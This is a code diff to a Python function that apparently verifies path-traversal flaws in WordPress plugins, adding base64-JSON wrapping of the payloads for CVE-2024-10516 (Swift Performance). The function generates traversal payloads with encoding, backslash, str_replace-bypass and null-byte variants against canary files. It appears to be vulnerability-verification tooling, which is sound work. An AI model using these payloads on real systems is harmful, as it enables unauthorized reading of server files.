@@ -4089,18 +4089,51 @@ def verify_wordpress_path_traversal(
         # peticion real, no una suposicion que se cuela como si fuera un hecho confirmado.
         rel = canary_path.lstrip("/")
         depths = (2, 4, 6, 8, 10, 12)
-        attempts = [rel, canary_path]
-        attempts += [("../" * n) + rel for n in depths]
+
+        # Detectar si el path_param original es un JSON array codificado en base64
+        # (ej. CVE-2024-10516 Swift Performance: data=base64(["template-part","null","PATH"]))
+        # Si lo es, envolver cada payload en la misma estructura base64-JSON.
+        import base64 as _b64, json as _json
+        _b64_json_template: list | None = None
+        _b64_json_path_idx: int = -1
+        _orig_path_val = base_params.get(path_param, "")
+        if isinstance(_orig_path_val, str) and _orig_path_val:
+            try:
+                _decoded = _b64.b64decode(_orig_path_val + "==").decode("utf-8", errors="strict")
+                _parsed = _json.loads(_decoded)
+                if isinstance(_parsed, list) and len(_parsed) >= 2:
+                    # Buscar el elemento que parece una ruta (contiene '/' o '..')
+                    for _pi, _pv in enumerate(_parsed):
+                        if isinstance(_pv, str) and (".." in _pv or "/" in _pv):
+                            _b64_json_template = list(_parsed)
+                            _b64_json_path_idx = _pi
+                            break
+            except Exception:
+                pass
+
+        def _wrap_path(p: str) -> str:
+            if _b64_json_template is not None:
+                _t = list(_b64_json_template)
+                _t[_b64_json_path_idx] = p
+                return _b64.b64encode(_json.dumps(_t, separators=(",", ":")).encode()).decode()
+            return p
+
+        if _b64_json_template is not None:
+            step(f"[LFI] path_param='{path_param}' contiene JSON base64 (idx {_b64_json_path_idx}): "
+                 f"cada payload sera codificado como base64(JSON)")
+
+        attempts = [_wrap_path(p) for p in [rel, canary_path]]
+        attempts += [_wrap_path(("../" * n) + rel) for n in depths]
         # variantes de codificacion/filtro (cada una ataca un saneo distinto que un codigo real
         # podria aplicar -- str_replace('../','') naive, basename() que no toca %2e, un WAF que
         # decodifica una sola vez, Windows que acepta backslash, o el null-byte historico de PHP
         # <5.3.4 que trunca la extension que el codigo pudiera anadir):
-        attempts += [("..%2f" * n) + rel for n in depths]                      # URL-encoded
-        attempts += [("%2e%2e%2f" * n) + rel for n in depths]                  # fully encoded
-        attempts += [("%252e%252e%252f" * n) + rel for n in depths]            # double-encoded
-        attempts += [("..\\" * n) + rel for n in depths]                       # backslash (Windows)
-        attempts += [("....//" * n) + rel for n in depths]                     # bypass str_replace('../','')
-        attempts += [rel + "%00", canary_path + "%00"]                         # null-byte legacy
+        attempts += [_wrap_path(("..%2f" * n) + rel) for n in depths]                      # URL-encoded
+        attempts += [_wrap_path(("%2e%2e%2f" * n) + rel) for n in depths]                  # fully encoded
+        attempts += [_wrap_path(("%252e%252e%252f" * n) + rel) for n in depths]            # double-encoded
+        attempts += [_wrap_path(("..\\" * n) + rel) for n in depths]                       # backslash (Windows)
+        attempts += [_wrap_path(("....//" * n) + rel) for n in depths]                     # bypass str_replace('../','')
+        attempts += [_wrap_path(rel + "%00"), _wrap_path(canary_path + "%00")]             # null-byte legacy
         # PHP-canary attempts: para LFI donde el codigo hace include/require_once con .php hardcoded
         # (ej. require_once __DIR__.'/tabs/'.$tab.'.php') -- el .txt canary no funciona porque PHP
         # lo convierte en .txt.php (inexistente). La solucion: usar paths SIN extension para que PHP
@@ -4109,10 +4142,10 @@ def verify_wordpress_path_traversal(
         if php_secret and _php_canary_ok:
             php_rel = php_canary_path[:-4].lstrip("/")  # "tmp/binoracle_canary_TOKEN" sin .php
             _all_secrets.add(php_secret)
-            attempts += [php_rel, php_canary_path[:-4]]
-            attempts += [("../" * n) + php_rel for n in depths]
-            attempts += [("..%2f" * n) + php_rel for n in depths]
-            attempts += [("....//" * n) + php_rel for n in depths]
+            attempts += [_wrap_path(p) for p in [php_rel, php_canary_path[:-4]]]
+            attempts += [_wrap_path(("../" * n) + php_rel) for n in depths]
+            attempts += [_wrap_path(("..%2f" * n) + php_rel) for n in depths]
+            attempts += [_wrap_path(("....//" * n) + php_rel) for n in depths]
         found = False
         tried = []
         for payload_value in attempts:
